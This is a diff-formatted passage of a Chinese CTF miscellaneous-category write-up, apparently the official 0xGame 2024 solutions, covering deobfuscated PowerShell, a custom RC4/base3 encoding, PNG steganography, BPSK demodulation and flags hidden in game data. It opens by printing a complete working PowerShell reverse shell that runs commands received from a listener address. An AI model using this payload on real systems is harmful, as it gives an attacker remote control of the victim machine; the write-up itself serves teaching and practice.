 <p>主要是将变量名变得复杂一些+base64加密关键代码，最终解完混淆可以发现执行了一个反弹shell的操作：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$LHOST</span> = <span class="string">&quot;192.168.93.132&quot;</span>; <span class="variable">$LPORT</span> = <span class="number">2333</span>; <span class="variable">$TCPClient</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="variable">$LHOST</span>, <span class="variable">$LPORT</span>); <span class="variable">$NetworkStream</span> = <span class="variable">$TCPClient</span>.GetStream(); <span class="variable">$StreamReader</span> = <span class="built_in">New-Object</span> IO.StreamReader(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span> = <span class="built_in">New-Object</span> IO.StreamWriter(<span class="variable">$NetworkStream</span>); <span class="variable">$StreamWriter</span>.AutoFlush = <span class="variable">$true</span>; <span class="variable">$Buffer</span> = <span class="built_in">New-Object</span> System.Byte[] <span class="number">1024</span>; <span class="keyword">while</span> (<span class="variable">$TCPClient</span>.Connected) &#123; <span class="keyword">while</span> (<span class="variable">$NetworkStream</span>.DataAvailable) &#123; <span class="variable">$RawData</span> = <span class="variable">$NetworkStream</span>.Read(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$Buffer</span>.Length); <span class="variable">$Code</span> = ([<span class="type">text.encoding</span>]::UTF8).GetString(<span class="variable">$Buffer</span>, <span class="number">0</span>, <span class="variable">$RawData</span> <span class="literal">-1</span>) &#125;; <span class="keyword">if</span> (<span class="variable">$TCPClient</span>.Connected <span class="operator">-and</span> <span class="variable">$Code</span>.Length <span class="operator">-gt</span> <span class="number">1</span>) &#123; <span class="variable">$Output</span> = <span class="keyword">try</span> &#123; <span class="built_in">Invoke-Expression</span> (<span class="variable">$Code</span>) <span class="number">2</span>&gt;&amp;<span class="number">1</span> &#125; <span class="keyword">catch</span> &#123; <span class="variable">$_</span> &#125;; <span class="variable">$StreamWriter</span>.Write(<span class="string">&quot;<span class="variable">$Output</span>`n&quot;</span>); <span class="variable">$Code</span> = <span class="variable">$null</span> &#125; &#125;; <span class="variable">$TCPClient</span>.Close(); <span class="variable">$NetworkStream</span>.Close(); <span class="variable">$StreamReader</span>.Close(); <span class="variable">$StreamWriter</span>.Close()</span><br></pre></td></tr></table></figure>
+
 <p>之后计算MD5值就能得到flag：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496036760-2b3aad84-9059-4d8d-b90b-abbea4d9957d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="我叫曼波">我叫曼波</h3>
-<p>题目附件给了 <code>encode.py</code>，加密的流程基本都给出了：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036760-2b3aad84-9059-4d8d-b90b-abbea4d9957d.png" alt="img"></p>
+<h3 id="我叫曼波"><a href="#我叫曼波" class="headerlink" title="我叫曼波"></a>我叫曼波</h3><p>题目附件给了 <code>encode.py</code>，加密的流程基本都给出了：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;0xGame&#123;This_is_a_fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">real_real_real_random</span>():</span><br><span class="line">    random_num = random.randint(<span class="number">1</span>,<span class="number">1000</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random_num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">plain,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        cipher.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(<span class="string">&quot;&quot;</span>.join(cipher).encode())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">s</span>):</span><br><span class="line">    base3_s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        dec_value = <span class="built_in">ord</span>(i)</span><br><span class="line">        base3_c = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> dec_value &gt; <span class="number">0</span>:</span><br><span class="line">            base3_c += <span class="built_in">str</span>(dec_value % <span class="number">3</span>)</span><br><span class="line">            dec_value = dec_value // <span class="number">3</span></span><br><span class="line">        base3_c = base3_c[::-<span class="number">1</span>].rjust(<span class="number">5</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        base3_s += base3_c</span><br><span class="line">    <span class="keyword">return</span> (base3_s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_encode</span>(<span class="params">base3_s</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;0&quot;</span>:<span class="string">&quot;曼波&quot;</span>,<span class="string">&quot;1&quot;</span>:<span class="string">&quot;哦耶&quot;</span>,<span class="string">&quot;2&quot;</span>:<span class="string">&quot;哇嗷&quot;</span>&#125;</span><br><span class="line">    manbo_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> base3_s:</span><br><span class="line">        manbo_text += manbo_dict[i]</span><br><span class="line">    <span class="keyword">return</span> manbo_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">i</span>):</span><br><span class="line">    flag_part = flag[i:i+<span class="number">1</span>]</span><br><span class="line">    a = real_real_real_random()</span><br><span class="line">    b = RC4(flag_part,a)</span><br><span class="line">    c = base3(b)</span><br><span class="line">    d = manbo_encode(c)</span><br><span class="line">    <span class="keyword">return</span> a,d  <span class="comment"># key:a  ciphertext:d</span></span><br></pre></td></tr></table></figure>
+
 <p>分析一下可以知道先生成随机数用作RC4的KEY，再传入flag_part进行RC4加密，之后进行三进制编码，最后自定义了一个曼波编码，于是可以编写<code>decode.py</code>并进行远程交互：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">manbo_decode</span>(<span class="params">d</span>):</span><br><span class="line">    manbo_dict = &#123;<span class="string">&quot;曼波&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;哦耶&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;哇嗷&quot;</span>:<span class="string">&quot;2&quot;</span>&#125;</span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(d),<span class="number">2</span>):</span><br><span class="line">        c += manbo_dict[d[i:i+<span class="number">2</span>]]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base3</span>(<span class="params">c</span>):</span><br><span class="line">    b = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">5</span>):</span><br><span class="line">        b += <span class="built_in">chr</span>(<span class="built_in">int</span>(c[i:i+<span class="number">5</span>],base=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RC4</span>(<span class="params">cipher,K</span>):</span><br><span class="line">    S = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        S[i] = i</span><br><span class="line">        T[i] = K[i % <span class="built_in">len</span>(K)]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>): </span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(T[i])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plain = []</span><br><span class="line">    cipher = base64.b64decode(cipher.encode()).decode()</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        t = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        k = S[t]</span><br><span class="line">        plain.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    key = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getciphertext</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    ciphertext = p.recvline().decode().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">k,c</span>):</span><br><span class="line">    c2 = manbo_decode(c)</span><br><span class="line">    c3 = base3(c2)</span><br><span class="line">    pf = RC4(c3,k)</span><br><span class="line">    <span class="keyword">return</span> pf</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.98.178.117&quot;</span>,<span class="number">1111</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    generate()</span><br><span class="line">    key = getkey()</span><br><span class="line">    ciphertext = getciphertext()</span><br><span class="line">    part_of_flag = decode(key,ciphertext)</span><br><span class="line">    flag += part_of_flag</span><br><span class="line">    <span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure>
-<h3 id="报告哈基米">报告哈基米</h3>
-<p>题目附件只给了一个 <code>mijiha.png</code>，拖入010
-Editor看一下，一眼就能看见文件尾的逆置字符串，再关注一下chunk块就能发现倒数第二个IDAT块未满的情况下还跟了一个IDAT块，不过其实眼神好一些可以直接注意到上方的
-<code>txt.ahijim</code>：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496036752-7ea27f23-a417-43f3-b395-08b721a52d6a.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+
+<h3 id="报告哈基米"><a href="#报告哈基米" class="headerlink" title="报告哈基米"></a>报告哈基米</h3><p>题目附件只给了一个 <code>mijiha.png</code>，拖入010 Editor看一下，一眼就能看见文件尾的逆置字符串，再关注一下chunk块就能发现倒数第二个IDAT块未满的情况下还跟了一个IDAT块，不过其实眼神好一些可以直接注意到上方的 <code>txt.ahijim</code>：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036752-7ea27f23-a417-43f3-b395-08b721a52d6a.png" alt="img"></p>
 <p>先对文件尾的字符串逆置一下可以得到：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Maybe You Need To Know Arnold Cat?</span><br></pre></td></tr></table></figure>
+
 <p>查阅资料可以知道这是猫映射变换，可以进行逆变换，不过需要知道<code>a,b</code>参数以及<code>shuffle_times</code>置乱次数，经过一些尝试可以发现这些参数通过LSB隐写进图片中了，可以用stegsolve，也可以用zsteg：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496037547-f4c4ceed-b651-4cf6-b0fd-8d21adcbd1c1.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037547-f4c4ceed-b651-4cf6-b0fd-8d21adcbd1c1.png" alt="img"></p>
 <p>之后编写脚本或者直接在网上找到逆变换脚本即可解出flag前半部分：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arnold_decode</span>(<span class="params">image,a,b</span>):</span><br><span class="line">    decode_image = Image.new(image.mode, image.size)</span><br><span class="line">    h,w = image.size</span><br><span class="line">    data = image.load()</span><br><span class="line">    ddata = decode_image.load()</span><br><span class="line">    N = h</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            nx = ((a * b + <span class="number">1</span>) * x - b * y) % N</span><br><span class="line">            ny = (y - a * x) % N</span><br><span class="line">            ddata[ny, nx] = data[y, x]</span><br><span class="line">    <span class="keyword">return</span> decode_image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&quot;mijiha.png&quot;</span>)</span><br><span class="line">origin_img = arnold_decode(img,<span class="number">35</span>,<span class="number">7</span>)</span><br><span class="line">origin_img.show()</span><br></pre></td></tr></table></figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496037557-5e9b95ad-5e7f-47a1-8fa8-206d5bd7005d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037557-5e9b95ad-5e7f-47a1-8fa8-206d5bd7005d.png" alt="img"></p>
 <p>再分析多出来的chunk块，仔细观察可以发现是zip逆置了，提取出来：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496037368-a1815d7c-d52a-44a3-9741-46bc752930db.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037368-a1815d7c-d52a-44a3-9741-46bc752930db.png" alt="img"></p>
 <p>解压得到<code>mijiha.txt</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?reppuT sihT sI</span><br><span class="line">2526565031717334081355849302824518400002066054780560033875031426082285618693525319794798626066006125490363219506086284195590452459190680646206136430850230509326192863922658924373311369100100099532515379974605057083065159988318523088554342510823923801250157027140252790785117812414283997607047894726844336402237327944299070706739459672938738683171995926543691983512367190948019577689694975313311316787244413406201168210658030717811912751907802312004909911805602609847391116950248882484065492329404895296665244558410377999740959307786584149849</span><br></pre></td></tr></table></figure>
+
 <p>同样将其整段逆置：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">9489414856877039590479997730148554425666925984049232945604842888420596111937489062065081199094002132087091572191187170308560128611026043144427876131133135794969867759108490917632153891963456295991713868378392769549376070709924497237322046334486274987407067993824142187115870972520417207510521083293280152434558803258138899515603807505064799735152359900010019631133734298562293682916239050320580346316026460860919542540955914826806059123630945216006606268974979135253968165822806241305783300650874506602000048154282039485531804337171305656252</span><br><span class="line">Is This Tupper?</span><br></pre></td></tr></table></figure>
+
 <p>查找Tupper相关资料，发现有在线工具可以直接解，拿到flag后半部分：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496037419-470a092d-c366-4137-aa75-fe013deb6c5d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>或者在github上也能找到相关项目https://github.com/cariad/tupper：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496037462-21c119ef-a046-4e68-916d-77905048fbfc.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="神秘电波">神秘电波*</h3>
-<p>搜索一下grc文件，不难发现这是gnuradio图形化设计文件。下载gnuradio后打开即可看到流程图。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130635605-a295e945-e07f-46e7-9efc-fc44bfc57b36.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>从constellation
-object那个模块可以看到，这里是进行了bpsk调制，只不过后面稍微加了一点简单的数学运算。去gnuradio的<a
-target="_blank" rel="noopener" href="https://wiki.gnuradio.org/index.php?title=Simulation_example:_BPSK_Demodulation">官方文档</a>可以查到bpsk的解调方法。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130635510-905d8f72-ebb2-4582-91f8-6018e9187144.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>但是显然这边还得改改，有几点要注意，首先文档中不是像题目中一样从文件输入的，文档中用的是虚拟源，输出也是虚拟的。另外题目中调制时有polyphase
-clock
-sync这一步，而题目中没有，所以在解调的时候得加上。因此，预期的解调流程图如下：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130635602-71bd6865-9da5-454f-9c25-9de25cb3bc39.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037419-470a092d-c366-4137-aa75-fe013deb6c5d.png" alt="img"></p>
+<p>或者在github上也能找到相关项目<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/cariad/tupper%EF%BC%9A">https://github.com/cariad/tupper：</a></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496037462-21c119ef-a046-4e68-916d-77905048fbfc.png" alt="img"></p>
+<h3 id="神秘电波"><a href="#神秘电波" class="headerlink" title="神秘电波*"></a>神秘电波*</h3><p>搜索一下grc文件，不难发现这是gnuradio图形化设计文件。下载gnuradio后打开即可看到流程图。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635605-a295e945-e07f-46e7-9efc-fc44bfc57b36.png" alt="img"></p>
+<p>从constellation object那个模块可以看到，这里是进行了bpsk调制，只不过后面稍微加了一点简单的数学运算。去gnuradio的<a target="_blank" rel="noopener external nofollow noreferrer" href="https://wiki.gnuradio.org/index.php?title=Simulation_example:_BPSK_Demodulation">官方文档</a>可以查到bpsk的解调方法。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635510-905d8f72-ebb2-4582-91f8-6018e9187144.png" alt="img"></p>
+<p>但是显然这边还得改改，有几点要注意，首先文档中不是像题目中一样从文件输入的，文档中用的是虚拟源，输出也是虚拟的。另外题目中调制时有polyphase clock sync这一步，而题目中没有，所以在解调的时候得加上。因此，预期的解调流程图如下：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635602-71bd6865-9da5-454f-9c25-9de25cb3bc39.png" alt="img"></p>
 <p>点击顶上的run，先generate，再execute。这个小窗口刚出来差不多就可以关掉了，以免生成的flag.txt太大。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130635529-f390f874-9f7f-4062-bd1c-9196806f846b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>用010
-editor可以看到，flag.txt是个二进制文件，每个字节不是00就是01。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130635731-01d4bfee-6401-4bea-8a2d-2e55cdee971b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635529-f390f874-9f7f-4062-bd1c-9196806f846b.png" alt="img"></p>
+<p>用010 editor可以看到，flag.txt是个二进制文件，每个字节不是00就是01。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130635731-01d4bfee-6401-4bea-8a2d-2e55cdee971b.png" alt="img"></p>
 <p>用脚本将00转换成0,01转换成1</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=f.read()</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x01</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> i==<span class="number">0x00</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
 <p>转换出的二进制丢进cyberchef即可看见flag</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130636752-7821b8ea-6fb7-4cc7-9145-d42f905b8aea.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636752-7821b8ea-6fb7-4cc7-9145-d42f905b8aea.png" alt="img"></p>
 <p>由于解调时一些数据的丢失，这里存在一些乱码。题目提示了flag是标准uuid形式，结合前后不难推断出flag：0xGame{38df7992-6c53-11ef-b522-c8348e2c93c6}</p>
-<h3 id="重生之我在南邮当ctf大王">重生之我在南邮当CTF大王</h3>
-<p>硬玩游戏可以拿到flag2,flag3,flag4，不过flag1可能需要按照许愿树的hint去做</p>
+<h3 id="重生之我在南邮当CTF大王"><a href="#重生之我在南邮当CTF大王" class="headerlink" title="重生之我在南邮当CTF大王"></a>重生之我在南邮当CTF大王</h3><p>硬玩游戏可以拿到flag2,flag3,flag4，不过flag1可能需要按照许愿树的hint去做</p>
 <p>可以在<code>data</code>文件夹中找到各张地图的json数据，一个一个看就会发现所有flag都在里面</p>
 <p>flag1:</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130636833-dcd7f82c-ff56-4b44-9a11-5a839c293098.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130637500-2ff3dd78-ed0e-4886-8fc7-90c5a6ae8eac.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130636833-dcd7f82c-ff56-4b44-9a11-5a839c293098.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130637500-2ff3dd78-ed0e-4886-8fc7-90c5a6ae8eac.png" alt="img"></p>
 <p>flag2:</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638100-af5d6f20-19f5-4edb-a228-22cb3c5579de.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638100-af5d6f20-19f5-4edb-a228-22cb3c5579de.png" alt="img"></p>
 <p>flag3:</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638134-712c87bb-d7f3-49ca-91b6-8d7fc5eba5f1.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1730130638134-712c87bb-d7f3-49ca-91b6-8d7fc5eba5f1.png" alt="img"></p>
 <p>flag4:</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1730130638119-019fc670-6063-4f07-9960-0d586c637a4d.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
